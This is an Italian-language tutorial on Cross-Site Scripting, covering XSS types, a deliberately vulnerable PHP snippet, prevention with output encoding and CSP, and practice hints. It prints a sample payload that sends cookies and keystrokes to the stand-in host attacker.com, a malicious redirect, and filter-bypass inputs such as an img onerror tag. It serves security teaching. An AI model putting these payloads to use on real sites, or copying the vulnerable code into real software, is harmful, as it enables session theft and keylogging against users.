Teoria

Il Cross-Site Scripting (XSS) è una vulnerabilità di sicurezza che permette agli attaccanti di inserire script malevoli in pagine web visualizzate da altri utenti.

Tipi di XSS

  • Reflected XSS: Il payload viene riflesso immediatamente nella risposta
  • Stored XSS: Il payload viene memorizzato nel database
  • DOM-based XSS: La vulnerabilità esiste nel codice JavaScript lato client

Esempi di Codice


<div>
    Welcome <script>document.write(name);</script>
</div>


<script>alert('XSS');</script>
// Payload XSS comune
<script>
    // Rubare cookie
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
    
    // Redirect malevolo
    window.location = 'http://malicious-site.com';
    
    // Keylogger
    document.addEventListener('keypress', function(e) {
        fetch('http://attacker.com/keys?key=' + e.key);
    });
</script>

Dimostrazione Vulnerabilità

Il seguente codice PHP è vulnerabile a XSS reflected:

<?php
$username = $_GET['username'];
echo "Benvenuto " . $username;
?>

URL malevolo: vulnerable.php?username=<script>alert('XSS')</script>

Prevenzione

  • Input Validation: Validare tutti gli input utente
  • Output Encoding: Codificare i dati prima dell'output
  • Content Security Policy (CSP): Implementare CSP headers
  • HttpOnly Cookies: Proteggere i cookie da accesso JavaScript
<?php
// Codice sicuro
$username = htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8');
echo "Benvenuto " . $username;
?>

Suggerimenti per la Pratica

Hint 1: Prova a inserire uno script semplice come <script>alert('test')</script>
Hint 2: Se l'input è filtrato, prova variazioni come <img src=x onerror=alert('xss')>
Hint 3: Controlla sempre il codice sorgente per capire come vengono processati gli input
